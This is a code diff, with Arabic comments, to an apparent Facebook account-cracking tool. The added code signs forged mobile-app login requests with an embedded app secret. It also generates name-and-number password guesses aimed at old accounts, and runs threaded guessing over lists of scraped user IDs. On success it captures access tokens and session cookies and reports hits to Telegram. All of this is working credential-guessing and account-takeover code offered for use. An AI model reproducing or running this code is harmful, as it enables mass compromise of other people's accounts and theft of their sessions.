@@ -16,6 +16,7 @@ import string
 import random
 import requests
 import base64
+import hashlib
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
@@ -121,12 +122,47 @@ def main_menu():
     else: main_menu()
 
 # --- [ M1: THE POWERFUL B-API METHOD ] ---
+# تأكد أنك أضفت import hashlib في أول سطر في ملفك
+
 def method_m1(uid, password, method):
     global loop, oks, cps
     session = requests.Session()
     ua = get_ua_pro()
     try:
-        # بيانات هيدرز تحاكي التطبيق الرسمي تماماً
+        # توليد معرفات فريدة لكل محاولة لمنع كشف الجهاز
+        device_id = str(uuid.uuid4())
+        adid = str(uuid.uuid4())
+        
+        # البيانات المطلوبة للسيرفر (Payload)
+        data = {
+            'adid': adid,
+            'format': 'json',
+            'device_id': device_id,
+            'email': uid,
+            'password': password,
+            'generate_analytics_claims': '1',
+            'community_id': '',
+            'cpl': 'true',
+            'try_num': '1',
+            'family_device_id': str(uuid.uuid4()),
+            'credentials_type': 'password',
+            'source': 'login',
+            'error_detail_type': 'button_with_disabled',
+            'enroll_misauth': 'false',
+            'generate_session_cookies': '1',
+            'generate_machine_id': '1',
+            'currently_logged_in_userid': '0',
+            'method': 'auth.login',
+            'fb_api_req_friendly_name': 'authenticate',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        }
+        
+        # --- [ الخطوة الأهم: توليد التوقيع البرمجي SIG ] ---
+        # نقوم بترتيب البيانات أبجدياً ثم تشفيرها مع الـ Secret Key
+        sig_string = "".join(f"{k}={v}" for k, v in sorted(data.items()))
+        data['sig'] = hashlib.md5((sig_string + "62f8ce9f74b12f84c123cc23437a4a32").encode()).hexdigest()
+        
         headers = {
             'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -134,30 +170,25 @@ def method_m1(uid, password, method):
             'X-FB-HTTP-Engine': 'Liger',
             'X-FB-Client-IP': 'True',
             'X-FB-Server-Cluster': 'True',
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            'X-FB-Connection-Type': 'WIFI',
         }
-        # داتا تسجيل الدخول المشفرة
-        payload = {
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'format': 'json',
-            'sdk_version': '1',
-            'email': uid,
-            'password': password,
-            'locale': 'ar_EG',
-            'sdk': 'android',
-            'sig': '3f555f98fb14fcdbf9a4c4448c991025'
-        }
-        res = session.post("https://b-api.facebook.com/method/auth.login", data=payload, headers=headers).json()
+        
+        response = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers)
+        res = response.json()
         
         if "access_token" in res:
-            handle_ok(uid, password, method)
+            # استخراج التوكن والكوكيز لفتح الحساب فوراً
+            token = res['access_token']
+            cookie = ";".join(f"{i['name']}={i['value']}" for i in res.get('session_cookies', []))
+            handle_ok(uid, f"{password} | {token} | {cookie}", method)
             return True
-        elif "checkpoint" in str(res) or "error_msg" in str(res) and "www.facebook.com" in str(res):
+        elif "checkpoint" in str(res) or res.get("error_code") == 405:
             handle_cp(uid, password, method)
             return True
     except:
         pass
     return False
+
 
 # --- [ M2: MBASIC SMART LOGIC ] ---
 def method_m2(uid, password, method):
@@ -225,87 +256,50 @@ def method_m3(uid, password, method):
     except:
         pass
     return False
-# --- [ 2. SMART PASSWORD GENERATOR - محرك الذكاء الاصطناعي لتخمين الباسورد ] ---
 def generate_pws_pro(uid, name):
-    """توليد كلمات سر ذكية بناءً على بيانات الحساب لضمان اختراق أسرع وأقوى"""
+    """توليد كلمات سر احترافية لصيد حسابات 2010 والحسابات القديمة"""
     pws = []
+    
+    # تحضير الاسم الأول والأخير بدقة
     if not name or name == "Facebook User":
-        # في حال عدم وجود اسم (سحب أيديات فقط)، نعتمد على استراتيجية الأرقام
-        pws = [uid, uid[:6], uid[:8], uid[-6:], uid[-8:], "123456", "11223344", "12345678", "786786"]
+        # إذا كان الحساب بدون اسم (أيديات فقط) نركز على الأرقام التي سألت عنها
+        pws = [uid, uid[:6], uid[:8], "123456", "1234567", "12345678", "123456789", "123123", "112233"]
     else:
         nm = name.lower()
-        first_name = nm.split(' ')[0]
-        # استهداف الحسابات القديمة 2009/2010 بكلمات سر مخصصة
-        if len(first_name) >= 3:
-            pws.append(first_name + "123")
-            pws.append(first_name + "1234")
-            pws.append(first_name + "12345")
-            pws.append(first_name + "1122")
-            pws.append(first_name + "123123")
-            pws.append(first_name + "2009")
-            pws.append(first_name + "2010")
-            pws.append(first_name + "2024")
-            pws.append(first_name + "2025")
-            pws.append(first_name + "2026")
-            pws.append(first_name + first_name)
-            pws.append(first_name + "00")
-            pws.append(first_name + "007")
+        parts = nm.split(' ')
+        first = parts[0]
+        last = parts[-1] if len(parts) > 1 else first
         
-        # إضافة الباسوردات الأكثر شيوعاً في الوطن العربي (قوة الصيد العام)
-        pws.extend([nm, "123456", "12345678", "11223344", "000000", "123123", "password", "123456789"])
-        pws.extend(["102030", "556677", "112255", "khaled", "moussa", "algeria"])
+        # الأنماط العشرين التي طلبتها (مثالية لـ 2010)
+        pws = [
+            f"{last}{first}",            # lastfirst
+            f"{first}{first}",           # firstfirst
+            f"{first}{last}",            # firstlast
+            f"{last} {last}",            # last last
+            f" {first} {first}",         #  first first
+            f"{last} {first}",           # last first
+            f" {first} {last}",          #  first last
+            f"{first}123",               # first123
+            f"{first}12345",             # first12345
+            f"{first}1234",              # first1234
+            f"{first}123456",            # first123456
+            f"{first}123456789",         # first123456789
+            f"{first}{last}123456",      # firstlast123456
+            f"{first}@123",              # first@123
+            f"{first}2002",              # first2002
+            f"{first}2003",              # first2003
+            f"{first}2001",              # first2001
+            f"{first}2000",              # first2000
+            f"{first}2020",              # first2020
+            f"{first}1999"               # first1999
+        ]
         
-        # دمج الأيدي مع الكلمات (أسلوب صيد المحترفين لتخطي الحماية)
-        pws.append(first_name + uid[-4:])
-        pws.append(first_name + uid[-6:])
-        pws.append(uid[-7:])
-        
-    # تنظيف القائمة من التكرار لضمان أقصى سرعة في ThreadPool
-    return list(set(pws))
+        # إضافة الأرقام العامة في نهاية القائمة لزيادة الحماية
+        pws.extend(["123456", "1234567", "12345678", "123456789"])
 
-# --- [ EXECUTION ENGINE - محرك الهجوم الرئيسي المحسن ] ---
-def execute_attack(uid, name, method_choice):
-    global loop, oks, cps
-    # عرض العداد بأسلوب Bilal الاحترافي مع تفاصيل الميثود
-    sys.stdout.write(f'\r\r{W}[{G}MOHA-02{W}] {loop}|OK:{G}{len(oks)}{W}|CP:{R}{len(cps)}{W} [{Y}{method_choice}{W}] ')
-    sys.stdout.flush()
-    
-    # استدعاء محرك توليد الباسوردات
-    pws = generate_pws_pro(uid, name)
-    
-    for pw in pws:
-        success = False
-        try:
-            # توجيه الهجوم للميثود المختار بدقة
-            if method_choice == "M1":
-                success = method_m1(uid, pw, "M1")
-            elif method_choice == "M2":
-                success = method_m2(uid, pw, "M2")
-            elif method_choice == "M3":
-                success = method_m3(uid, pw, "M3")
-            elif method_choice == "M4":
-                success = method_m4(uid, pw, "M4")
-            elif method_choice == "M5":
-                success = method_m5(uid, pw, "M5")
-            elif method_choice == "M6":
-                success = method_m6(uid, pw, "M6")
-            elif method_choice == "M7":
-                success = method_m7(uid, pw, "M7")
-            elif method_choice == "M8":
-                success = method_m8(uid, pw, "M8")
-            
-            # إذا نجح الميثود (صيد OK أو CP)، ننتقل للأيدي التالي فوراً لتوفير الوقت
-            if success:
-                break
-                
-            # تأخير ميكرو-ثاني لضمان استقرار المعالج في هاتف OPPO A16k
-            time.sleep(0.02)
-            
-        except Exception:
-            # حماية المحرك من الانهيار في حال حدوث خطأ في الشبكة
-            continue
-            
-    loop += 1
+    return [p for p in pws if p]
+
+
 
 # --- [ SYSTEM UPDATE & CLEANUP - صيانة الأداة ] ---
 def update_system():
@@ -442,27 +436,47 @@ def method_m9(uid, password, method):
 # أقوى ميثود حالياً يستخدم محرك Tigon لتخطي أنظمة الحماية الحديثة
 def method_m10(uid, password, method):
     global loop, oks, cps
+    session = requests.Session()
     try:
+        ua = get_ua_pro()
+        device_id = str(uuid.uuid4())
+        adid = str(uuid.uuid4())
+        
+        # هيدرات محرك Tigon الاحترافي
         headers = {
-            'User-Agent': get_ua_pro(),
+            'User-Agent': ua,
             'X-FB-HTTP-Engine': 'Tigon',
             'X-FB-Client-IP': 'True',
             'X-FB-Server-Cluster': 'True',
-            'X-FB-Connection-Type': 'WIFI',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
             'Content-Type': 'application/x-www-form-urlencoded',
         }
+        
         payload = {
             'api_key': '882a8490361da98702bf97a021ddc14d',
-            'email': uid, 'password': password,
-            'method': 'auth.login', 'format': 'JSON',
+            'email': uid,
+            'password': password,
+            'method': 'auth.login',
+            'format': 'JSON',
+            'device_id': device_id,
+            'adid': adid,
         }
-        res = requests.post("https://graph.facebook.com/auth/login", data=payload, headers=headers).json()
+        
+        # توليد التوقيع لـ M10 أيضاً لضمان الاختراق
+        sig = "".join(f"{k}={v}" for k, v in sorted(payload.items()))
+        payload['sig'] = hashlib.md5((sig + "62f8ce9f74b12f84c123cc23437a4a32").encode()).hexdigest()
+        
+        res = session.post("https://graph.facebook.com/auth/login", data=payload, headers=headers).json()
+        
         if "access_token" in res:
-            handle_ok(uid, password, method); return True
+            handle_ok(uid, password, method)
+            return True
         elif "checkpoint" in str(res):
-            handle_cp(uid, password, method); return True
+            handle_cp(uid, password, method)
+            return True
     except: pass
     return False
+
 # --- [ 3. ADVANCED SCRAPER SYSTEM - نظام سحب البيانات المتطور ] ---
 
 def scraper_menu():
@@ -725,41 +739,91 @@ def file_crack_menu():
         print(f"{R} [!] File Not Found!"); time.sleep(2); main_menu()
 
 def start_cracking_engine():
-    """محرك التشغيل المتعدد (Multiprocessing Engine)"""
+    """نظام المسارات المنفصلة: تلقائي مباشر أو يدوي مخصص"""
     logo()
     print(f"{G} [1] {W}Method M1 (B-API)   {G}[Fast]")
     print(f"{G} [2] {W}Method M2 (Mbasic)  {Y}[Slow/Safe]")
     print(f"{G} [3] {W}Method M3 (Graph)   {G}[New]")
-    print(f"{G} [4] {W}Method M4 (Business){R}[High-Hit]")
-    print(f"{G} [5] {W}Method M5 (Touch)   {W}[Old IDs]")
-    print(f"{G} [6] {W}Method M6 (Instagram){P}[Bypass]")
-    print(f"{G} [7] {W}Method M7 (Free)    {C}[Data-Save]")
-    print(f"{G} [8] {W}Method M8 (Messenger){B}[Web-Gate]")
-    print(f"{G} [9] {W}Method M9 (Lite)    {G}[Lite-V2]")
     print(f"{G} [10]{W}Method M10(Tigon)   {R}[Ultimate]")
     print(f"{G}--------------------------------------------------")
     m_choice = input(f"{G} [?] {W}Select Method: ")
     method_name = f"M{m_choice}"
     
-    threads = int(input(f"{G} [?] {W}Enter Threads (1-100) [Default 30]: ") or 30)
+    print(f"{G}--------------------------------------------------")
+    print(f"{G} [1] {W}Use Auto Passwords (Fast)")
+    print(f"{G} [2] {W}Use Manual Passwords (Custom)")
+    pass_choice = input(f"{G} [?] {W}Select Option: ")
+    
+    manual_pws = []
+    use_auto = 'y'
+    
+    if pass_choice == '2':
+        use_auto = 'n'
+        try:
+            limit = int(input(f"{G} [?] {W}How many passwords to add: "))
+            for i in range(limit):
+                p = input(f"{G} [?] {W}Enter Password {i+1}: ")
+                if p.strip(): manual_pws.append(p.strip())
+        except ValueError:
+            print(f"{R} [!] Invalid number!"); time.sleep(2); return main_menu()
+    
+    threads = int(input(f"{G} [?] {W}Enter Threads (1-100) [30]: ") or 30)
     
     logo()
-    print(f"{G} [>] {W}Crack Started: {current_time}")
-    print(f"{G} [>] {W}Results saved in: {G}OK.txt / CP.txt")
-    print(f"{G} [>] {W}To stop: Press Ctrl + Z")
+    print(f"{G} [>] {W}Crack Started | Method: {method_name}")
+    print(f"{G} [>] {W}Mode: {'Auto' if use_auto == 'y' else 'Manual Only'}")
     print(f"{G}--------------------------------------------------")
     
     with ThreadPool(max_workers=threads) as moha_pool:
         for item in id_list:
-            uid, name = item.split('|')
-            moha_pool.submit(execute_attack, uid, name, method_name)
+            uid = item.split('|')[0] if '|' in item else item.strip()
+            name = item.split('|')[1] if '|' in item else "Facebook User"
+            moha_pool.submit(execute_attack, uid, name, method_name, manual_pws, use_auto)
     
-    print(f"\n{G}--------------------------------------------------")
-    print(f"{G} [!] {W}Crack Complete. Total OK: {G}{len(oks)}")
-    input(f"{G} [>] {W}Press Enter to Return...")
+    input(f"\n{G} [>] {W}Crack Finished. Press Enter...")
     main_menu()
 
+
+
+
 # --- [ 10. TARGETED ATTACK LOGIC - الهجوم المستهدف ] ---
+def execute_attack(uid, name, method_choice, manual_pws, use_auto):
+    """المحرك الرئيسي: المسؤول عن رفع العداد وفحص الكلمات"""
+    global loop, oks, cps
+    
+    # اختيار القائمة بناءً على طلبك (تلقائي أو يدوي)
+    if use_auto == 'y':
+        pws = generate_pws_pro(uid, name)
+    else:
+        pws = manual_pws
+        
+    for pw in pws:
+        # رفع العداد مع كل تجربة كلمة سر ليكون نشطاً
+        loop += 1
+        
+        # نظام ألوان عشوائي للعداد
+        clr = random.choice([G, C, P, B, Y])
+        
+        # طباعة العداد مع إخفاء كلمات السر (نظام نظيف)
+        sys.stdout.write(f'\r{W}[{clr}MOHA-V4{W}] {loop} | {G}OK:{len(oks)} {W}| {Y}CP:{len(cps)} {W}          ')
+        sys.stdout.flush()
+        
+        success = False
+        try:
+            # تنفيذ الميثود المختار
+            if method_choice == "M1": success = method_m1(uid, pw, "M1")
+            elif method_choice == "M2": success = method_m2(uid, pw, "M2")
+            elif method_choice == "M3": success = method_m3(uid, pw, "M3")
+            elif method_choice == "M4": success = method_m4(uid, pw, "M4")
+            elif method_choice == "M10": success = method_m10(uid, pw, "M10")
+            else: success = method_m1(uid, pw, "M1")
+            
+            if success:
+                # إرسال للتليجرام عند النجاح
+                send_to_telegram(uid, pw, "OK", method_choice)
+                break # ننتقل للحساب التالي إذا تم الصيد
+        except:
+            continue
 
 def target_menu():
     """هجوم مخصص على حساب معين عبر تخمين الباسوردات"""
